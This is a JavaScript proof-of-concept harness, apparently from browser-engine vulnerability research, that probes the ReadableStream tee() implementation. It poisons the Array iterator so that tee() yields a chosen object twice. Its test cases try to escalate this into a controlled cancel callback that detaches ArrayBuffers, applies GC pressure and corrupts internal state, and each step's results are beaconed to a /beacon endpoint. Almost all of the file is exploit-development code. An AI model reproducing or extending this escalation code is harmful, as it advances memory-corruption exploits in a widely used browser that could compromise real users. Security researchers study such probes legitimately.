// p513 — tee() private-name inversion: escalation via pre-populated ReadableStream
//
// V432/private-name-inversion confirmed: poisoned iterator yields same X twice
// from tee() result → C++ wraps X as InternalReadableStream → cancel(X) writes
// private slots onto X (state, disturbed). TypeError from undefined.@cancel().
//
// ESCALATION THEORY: If X is a REAL ReadableStream with a controller already,
// then readableStreamCancel(X) at line 874 of ReadableStreamInternals.js does:
//   @getByIdDirectPrivate(X, "readableStreamController").@cancel(controller, reason)
// which calls the cancelAlgorithm — OUR function.
//
// If we can get a controlled callback during tee() result iteration, we can:
// - Detach ArrayBuffers mid-operation
// - Modify prototype chains
// - Trigger GC
// - Modify the tee state object
//
// Test matrix:
// T1: Plain object X (baseline — should TypeError like V432)
// T2: Real ReadableStream as X with custom cancel (should call our cancel!)
// T3: Real ReadableStream X + cancel modifies global state
// T4: TransformStream writable side as X (different controller type)
// T5: Real RS X + cancel that triggers GC + AB detach during tee unwinding
//
// Beacon prefix: V513-

(function() {
  var T0 = Date.now();
  function B(tag, body) {
    try {
      var x = new XMLHttpRequest();
      x.open('POST', '/beacon/V513-' + tag, false);
      x.setRequestHeader('Content-Type', 'text/plain');
      x.send('[' + (Date.now() - T0) + 'ms] ' + (body || ''));
    } catch(e) {}
  }

  B('BOOT', navigator.userAgent);

  var results = {};

  // Helper: poison Array iterator to yield X twice
  function withPoisonedIterator(X, fn) {
    var origIter = Array.prototype[Symbol.iterator];
    var poisoned = false;
    Array.prototype[Symbol.iterator] = function() {
      if (poisoned) {
        // Only poison once (the tee result iteration)
        Array.prototype[Symbol.iterator] = origIter;
        return {
          _count: 0,
          next: function() {
            if (this._count < 2) {
              this._count++;
              return { value: X, done: false };
            }
            return { value: undefined, done: true };
          }
        };
      }
      return origIter.call(this);
    };
    poisoned = true;
    try {
      return fn();
    } finally {
      Array.prototype[Symbol.iterator] = origIter;
    }
  }

  // ═══════════════════════════════════════════════════
  // T1: Plain object baseline (same as V432)
  // ═══════════════════════════════════════════════════
  try {
    B('T1-START', 'plain object baseline');
    var plainX = {};
    var cancelCalled = false;

    // Create a real ReadableStream to tee
    var source = new ReadableStream({
      start: function(ctrl) { ctrl.close(); }
    });

    var threw = null;
    withPoisonedIterator(plainX, function() {
      try {
        source.tee();
      } catch(e) {
        threw = e;
      }
    });

    results.T1 = {
      threw: threw ? threw.constructor.name : 'none',
      msg: threw ? ('' + threw).slice(0, 100) : 'none',
      hasDist: ('disturbed' in plainX) ? 'N/A-noPrivate' : 'no-visible'
    };
    B('T1-DONE', JSON.stringify(results.T1));
  } catch(e) {
    B('T1-ERR', '' + e);
  }

  // ═══════════════════════════════════════════════════
  // T2: Real ReadableStream as X with custom cancel
  // ═══════════════════════════════════════════════════
  try {
    B('T2-START', 'real RS with custom cancel');
    var cancelCallLog = [];

    // Create X as a real ReadableStream with a cancel function we control
    var victimX = new ReadableStream({
      cancel: function(reason) {
        cancelCallLog.push({ reason: '' + reason, time: Date.now() - T0 });
        return new Promise(function(r) { r(); });
      }
    });

    // Create another stream to tee
    var source2 = new ReadableStream({
      start: function(ctrl) { ctrl.close(); }
    });

    var threw2 = null;
    withPoisonedIterator(victimX, function() {
      try {
        var pair = source2.tee();
        // If tee returns, try to cancel the "branches" (which are both X)
        try { pair[0].cancel('test-cancel-0'); } catch(e2) { cancelCallLog.push({cancelErr0: '' + e2}); }
        try { pair[1].cancel('test-cancel-1'); } catch(e3) { cancelCallLog.push({cancelErr1: '' + e3}); }
      } catch(e) {
        threw2 = e;
      }
    });

    results.T2 = {
      threw: threw2 ? threw2.constructor.name : 'none',
      msg: threw2 ? ('' + threw2).slice(0, 100) : 'none',
      cancelCalls: cancelCallLog.length,
      cancelLog: JSON.stringify(cancelCallLog).slice(0, 300)
    };
    B('T2-DONE', JSON.stringify(results.T2));
  } catch(e) {
    B('T2-ERR', '' + e);
  }

  // ═══════════════════════════════════════════════════
  // T3: Real RS X + cancel that triggers state mutation
  // ═══════════════════════════════════════════════════
  try {
    B('T3-START', 'RS cancel + state mutation');
    var mutationLog = [];
    var sharedABs = [];

    // Pre-allocate some ArrayBuffers we'll try to use during cancel
    for (var i = 0; i < 20; i++) {
      sharedABs.push(new ArrayBuffer(1024));
    }

    var victimX3 = new ReadableStream({
      cancel: function(reason) {
        mutationLog.push('cancel-enter');
        // During cancel callback, try various state mutations:
        // 1. Force GC
        try {
          var garbage = [];
          for (var g = 0; g < 10000; g++) garbage.push({a: new ArrayBuffer(256)});
          garbage = null;
        } catch(e) {}
        mutationLog.push('gc-pressure');

        // 2. Try to detach a shared AB via postMessage transfer
        try {
          var mc = new MessageChannel();
          mc.port1.postMessage('', [sharedABs[0]]);
          mutationLog.push('ab-transfer:' + (sharedABs[0].byteLength === 0 ? 'detached' : 'alive'));
        } catch(e) {
          mutationLog.push('ab-transfer-err:' + e.message.slice(0, 50));
        }

        // 3. Check if we can access internals of the tee state
        mutationLog.push('cancel-exit');
        return Promise.resolve();
      }
    });

    var source3 = new ReadableStream({
      pull: function(ctrl) {
        ctrl.enqueue('chunk1');
        ctrl.close();
      }
    });

    var threw3 = null;
    withPoisonedIterator(victimX3, function() {
      try {
        var pair = source3.tee();
        // The pair elements are now wrappers around victimX3
        // Read from the original source to trigger the tee pull
        var reader = pair[0].getReader();
        reader.read().then(function(r) {
          mutationLog.push('read-result:' + JSON.stringify(r).slice(0, 100));
        }).catch(function(e) {
          mutationLog.push('read-err:' + ('' + e).slice(0, 100));
        });
      } catch(e) {
        threw3 = e;
      }
    });

    // Give promises a chance to resolve
    setTimeout(function() {
      results.T3 = {
        threw: threw3 ? threw3.constructor.name : 'none',
        msg: threw3 ? ('' + threw3).slice(0, 100) : 'none',
        mutations: mutationLog.length,
        log: JSON.stringify(mutationLog).slice(0, 400)
      };
      B('T3-DONE', JSON.stringify(results.T3));
    }, 500);
  } catch(e) {
    B('T3-ERR', '' + e);
  }

  // ═══════════════════════════════════════════════════
  // T4: TransformStream writable side as X
  // ═══════════════════════════════════════════════════
  try {
    B('T4-START', 'TransformStream as X');

    var ts = new TransformStream({
      transform: function(chunk, ctrl) {
        ctrl.enqueue(chunk);
      }
    });

    // Use the readable side as X (it's a ReadableStream with a different controller type)
    var victimX4 = ts.readable;

    var source4 = new ReadableStream({
      start: function(ctrl) { ctrl.close(); }
    });

    var threw4 = null;
    var t4cancelLog = [];
    withPoisonedIterator(victimX4, function() {
      try {
        var pair = source4.tee();
        try {
          pair[0].cancel('ts-cancel');
          t4cancelLog.push('cancel-ok');
        } catch(e) {
          t4cancelLog.push('cancel-err:' + ('' + e).slice(0, 100));
        }
      } catch(e) {
        threw4 = e;
      }
    });

    results.T4 = {
      threw: threw4 ? threw4.constructor.name : 'none',
      msg: threw4 ? ('' + threw4).slice(0, 100) : 'none',
      cancelLog: JSON.stringify(t4cancelLog).slice(0, 200)
    };
    B('T4-DONE', JSON.stringify(results.T4));
  } catch(e) {
    B('T4-ERR', '' + e);
  }

  // ═══════════════════════════════════════════════════
  // T5: Double-tee — tee a tee'd stream with poisoned iterator
  // Tests deeper state confusion
  // ═══════════════════════════════════════════════════
  try {
    B('T5-START', 'double-tee confusion');

    var source5 = new ReadableStream({
      start: function(ctrl) {
        ctrl.enqueue('data1');
        ctrl.enqueue('data2');
        ctrl.close();
      }
    });

    // First tee is normal
    var normalPair = source5.tee();

    // Now create victim for second tee
    var victimX5 = new ReadableStream({
      cancel: function(r) {
        return Promise.resolve('5-cancelled');
      }
    });

    var threw5 = null;
    withPoisonedIterator(victimX5, function() {
      try {
        // Tee the first branch — poisoned iterator yields victimX5 twice
        normalPair[0].tee();
      } catch(e) {
        threw5 = e;
      }
    });

    results.T5 = {
      threw: threw5 ? threw5.constructor.name : 'none',
      msg: threw5 ? ('' + threw5).slice(0, 100) : 'none'
    };
    B('T5-DONE', JSON.stringify(results.T5));
  } catch(e) {
    B('T5-ERR', '' + e);
  }

  // Final summary after T3 timeout
  setTimeout(function() {
    B('SUMMARY', JSON.stringify(results).slice(0, 800));
    B('COMPLETE', 'all tests done');
  }, 1500);

})();
